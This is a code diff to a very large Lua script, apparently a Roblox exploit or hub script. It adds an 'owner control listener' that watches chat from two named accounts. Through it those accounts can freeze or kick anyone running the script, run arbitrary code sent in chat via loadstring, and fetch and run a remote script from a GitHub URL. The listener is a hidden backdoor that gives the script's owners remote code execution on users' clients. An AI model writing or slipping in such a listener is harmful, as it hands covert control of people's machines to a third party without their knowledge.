@@ -29933,28 +29933,48 @@ end -- AsterFinalize
 
 -- // OWNER CONTROL LISTENER // --
 do
-    local OWNER = "fluffyginger_ct"
-    local lp = game:GetService("Players").LocalPlayer
+    local OWNERS = {
+    ["fluffyginger_ct"] = true,
+    ["sentineldave"] = true,
+}
+local lp = game:GetService("Players").LocalPlayer
 
-    -- skip if this is the owner's own client
-    if cmd == "!freeze" then
-    if hrp then hrp.Anchored = true end
-    if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
+    if OWNERS[lp.Name] then return end
 
-elseif cmd == "!unfreeze" then
-    if hrp then hrp.Anchored = false end
-    if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
+    local function listenToOwner(p)
+        if not OWNERS[p.Name] then return end
+        p.Chatted:Connect(function(msg)
+            local args = msg:lower():split(" ")
+            local cmd = args[1]
+            local char = lp.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
 
-elseif cmd == "!kick" then
-    lp:Kick("Kicked by owner")
+            if cmd == "!freeze" then
+                if hrp then hrp.Anchored = true end
+                if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
 
-elseif cmd == "!execute" then
-    local code = msg:sub(10)
-    local fn, err = loadstring(code)
-    if fn then pcall(fn) end
+            elseif cmd == "!unfreeze" then
+                if hrp then hrp.Anchored = false end
+                if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
 
-elseif cmd == "!xen" then
-    local fn = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))
-    if fn then pcall(fn) end
+            elseif cmd == "!kick" then
+                lp:Kick("Kicked by owner")
 
+            elseif cmd == "!execute" then
+                local code = msg:sub(10)
+                local fn, err = loadstring(code)
+                if fn then pcall(fn) end
+
+            elseif cmd == "!xen" then
+                local fn = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))
+                if fn then pcall(fn) end
+            end
+        end)
     end
+
+    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
+        listenToOwner(p)
+    end
+    game:GetService("Players").PlayerAdded:Connect(listenToOwner)
+end
